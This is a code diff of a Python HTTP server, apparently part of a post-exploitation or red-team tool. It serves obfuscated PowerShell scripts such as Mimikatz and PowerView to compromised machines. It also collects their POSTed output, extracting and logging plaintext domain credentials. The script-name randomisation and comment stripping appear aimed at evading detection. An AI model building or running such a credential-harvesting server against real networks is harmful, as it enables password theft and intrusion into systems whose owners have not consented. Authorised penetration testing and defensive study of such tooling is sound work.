@@ -18,20 +18,28 @@ class MimikatzServer(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         print_message("%s - - %s" % (self.client_address[0], format%args))
 
+    def save_mimikatz_output(self, data):
+        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
+        with open('logs/' + log_name, 'w') as creds:
+            creds.write(data)
+        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
+
     def do_GET(self):
-        if self.path[5:].endswith('.ps1') and self.path[5:] in os.listdir('hosted'):
+        if self.path[1:].endswith('.ps1') and self.path[1:] in os.listdir('hosted'):
             self.send_response(200)
             self.end_headers()
-            with open('hosted/'+ self.path[4:], 'rb') as script:
+            with open('hosted/'+ self.path[1:], 'rb') as script:
                 ps_script = script.read()
-                ps_script = eval(synopsis.sub('', repr(ps_script))) #Removes the synopsys
-                ps_script = func_name.sub(settings.args.obfs_func_name, ps_script) #Randomizes the function name
-                ps_script = comments.sub('', ps_script) #Removes the comments
-                #logging.info('Sending the following modified powershell script: {}'.format(ps_script))
+                if self.path[1:] != 'powerview.ps1':
+                    logging.info('Obfuscating Powershell script')
+                    ps_script = eval(synopsis.sub('', repr(ps_script))) #Removes the synopsys
+                    ps_script = func_name.sub(settings.args.obfs_func_name, ps_script) #Randomizes the function name
+                    ps_script = comments.sub('', ps_script) #Removes the comments
+                    #logging.info('Sending the following modified powershell script: {}'.format(ps_script))
                 self.wfile.write(ps_script)
 
         elif settings.args.path:
-            if self.path[6:] == settings.args.path.split('/')[-1]:
+            if self.path[1:] == settings.args.path.split('/')[-1]:
                 self.send_response(200)
                 self.end_headers()
                 with open(settings.args.path, 'rb') as rbin:
@@ -50,25 +58,36 @@ class MimikatzServer(BaseHTTPRequestHandler):
         if settings.args.mimikatz:
             try:
                 buf = StringIO(data).readlines()
+                plaintext_creds = []
                 i = 0
                 while i < len(buf):
                     if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                         passw  = buf[i].split(':')[1].strip()
                         domain = buf[i-1].split(':')[1].strip()
                         user   = buf[i-2].split(':')[1].strip()
-                        print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
+                        plaintext_creds.append('{}\\{}:{}'.format(domain, user, passw))
 
                     i += 1
+
+                if plaintext_creds:
+                    print_succ('{} Found plain text credentials (domain\\user:password):'.format(self.client_address[0]))
+                    for cred in plaintext_creds:
+                        print_att(u'{}'.format(cred))
             except Exception as e:
                 print_error("Error while parsing Mimikatz output: {}".format(e))
 
-        elif settings.args.mimi_cmd:
-            print_att(data)
+            self.save_mimikatz_output(data)
 
-        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
-        with open('logs/' + log_name, 'w') as creds:
-            creds.write(data)
-        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
+        elif settings.args.mimikatz_cmd:
+            print_succ('{} Mimikatz command output:'.format(self.client_address[0]))
+            print_att(data)
+            self.save_mimikatz_output(data)
+
+        elif settings.args.powerview:
+            print_succ('{} PowerView command output:'.format(self.client_address[0]))
+            buf = StringIO(data.strip()).readlines()
+            for line in buf:
+                print_att(line.strip())
 
 def http_server():
     http_server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
